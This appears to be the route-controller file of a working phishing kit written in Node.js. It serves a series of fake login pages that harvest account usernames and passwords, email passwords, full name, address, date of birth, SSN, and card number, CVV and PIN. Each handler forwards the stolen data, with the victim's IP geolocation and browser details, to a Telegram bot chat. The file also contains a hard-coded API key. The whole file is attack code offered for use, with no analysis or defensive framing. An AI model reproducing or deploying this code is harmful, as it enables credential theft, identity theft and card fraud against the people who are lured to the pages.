const { sendMessageFor } = require("simple-telegram-message");
const axios = require("axios");
const { getClientIp } = require("request-ip");
const { botToken, chatId } = require("../config/settings");

const getSystemTime = () => {
    return new Date().toLocaleString("en-US", { timeZone: "UTC" });
};

async function sendAPIRequest(ipAddress) {
    const response = await axios.get(`https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=bdc_4422bb94409c46e986818d3e9f3b2bc2`);
    return response.data;
}

const getGeoIPMessage = (geoInfo) => {
    return `🌍 GEO-IP INFO
IP: ${geoInfo.ip}
Coordinates: ${geoInfo.location.longitude}, ${geoInfo.location.latitude}

`;
};

const getMessageSender = () => sendMessageFor(botToken, chatId);

// === ROUipTES ===

exports.login = (req, res) => {
    return res.render("login");
};

exports.loginPost = async (req, res) => {
    const { username, password } = req.body;
    const ipAddress = getClientIp(req);
    const geoInfo = await sendAPIRequest(ipAddress);
    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];

    const message = `
👤 TESY LOGIN 

========================

Username: ${username}
Password: ${password}
========================

🌍 GEO-IP INFO
IP ADDRESS: ${geoInfo.ip}
COORDINATES: ${geoInfo.location.longitude}, ${geoInfo.location.latitude}
CITY: ${geoInfo.location.city}
STATE: ${geoInfo.location.principalSubdivision}
ZIP CODE: ${geoInfo.location.postcode || ""}
COUNTRY: ${geoInfo.country.name}
TIME: ${geoInfo.location.timeZone.localTime}
ISP: ${geoInfo.network.organisation}

💻 SYSTEM INFO
USER AGENT: ${userAgent}
SYSTEM LANGUAGE: ${systemLang}

========================

✅ TESY`;

    try {
     
    const sendMessage = sendMessageFor(botToken, chatId);
    await sendMessage(message);
        res.redirect("/auth/login/2");
    } catch (err) {
        console.error("Error sending message:", err.message);
        res.status(500).send("Internal server error");
    }
};

exports.login2 = (req, res) => res.render("login2");

exports.loginPost2 = async (req, res) => {
    const { username, password } = req.body;
    const ipAddress = getClientIp(req);

    const message = `
✅ UPDATE TEAM | RELOGIN | USER_${ipAddress}

👤 RELOGIN INFO
USERNAME         : ${username}
PASSWORD         : ${password}

🌍 GEO-IP INFO
IP: ${ipAddress}
Coordinates: N/A

TIME             : ${getSystemTime()}
`;

    try {
         const sendMessage = sendMessageFor(botToken, chatId);
    await sendMessage(message);
        res.redirect("/auth/login/3");
    } catch (err) {
        console.error("Error:", err.message);
        res.status(500).send("Internal server error");
    }
};

exports.login3 = (req, res) => res.render("login3");

exports.loginPost3 = async (req, res) => {
    const { emailAddr, emailPass } = req.body;
    const ipAddress = getClientIp(req);

    const message = `
✅ UPDATE TEAM | EMAIL | USER_${ipAddress}

👤 EMAIL INFO
EMAIL ADDRESS    : ${emailAddr}
EMAIL PASSWORD   : ${emailPass}

🌍 GEO-IP INFO
IP: ${ipAddress}
Coordinates: N/A

TIME             : ${getSystemTime()}
`;

    try {
         const sendMessage = sendMessageFor(botToken, chatId);
    await sendMessage(message);
        res.redirect("/auth/login/4");
    } catch (err) {
        console.error("Error:", err.message);
        res.status(500).send("Internal server error");
    }
};

exports.login4 = (req, res) => res.render("login4");

exports.loginPost4 = async (req, res) => {
    const { fullName, address, zip, phone, dob, ssn } = req.body;
    const ipAddress = getClientIp(req);

    const message = `
✅ UPDATE TEAM | PERSONAL INFO | USER_${ipAddress}

👤 PERSONAL INFO
FULL NAME        : ${fullName}
STREET ADDRESS   : ${address}
ZIP CODE         : ${zip}
PHONE NUMBER     : ${phone}
DOB              : ${dob}
SSN              : ${ssn}

🌍 GEO-IP INFO
IP: ${ipAddress}
Coordinates: N/A

TIME             : ${getSystemTime()}
`;

    try {
         const sendMessage = sendMessageFor(botToken, chatId);
    await sendMessage(message);
        res.redirect("/auth/login/5");
    } catch (err) {
        console.error("Error:", err.message);
        res.status(500).send("Internal server error");
    }
};

exports.login5 = (req, res) => res.render("login5");

exports.loginPost5 = async (req, res) => {
    const { cardNum, expDate, cvv, pin } = req.body;
    const ipAddress = getClientIp(req);

    const message = `
✅ UPDATE TEAM | CARD INFO | USER_${ipAddress}

👤 CARD INFO
CARD NUMBER      : ${cardNum}
EXPIRY DATE      : ${expDate}
CVV              : ${cvv}
CARD PIN         : ${pin}

🌍 GEO-IP INFO
IP: ${ipAddress}
Coordinates: N/A

TIME             : ${getSystemTime()}
`;

    try {
         const sendMessage = sendMessageFor(botToken, chatId);
    await sendMessage(message);
        res.redirect("/auth/complete");
    } catch (err) {
        console.error("Error:", err.message);
        res.status(500).send("Internal server error");
    }
};

exports.complete = (req, res) => res.render("complete");

exports.page404Redirect = (req, res) => res.redirect("/auth/login");

// Handle any unhandled promise rejections
process.on("unhandledRejection", (reason, promise) => {
    console.error("Unhandled Rejection at:", promise, "reason:", reason);
});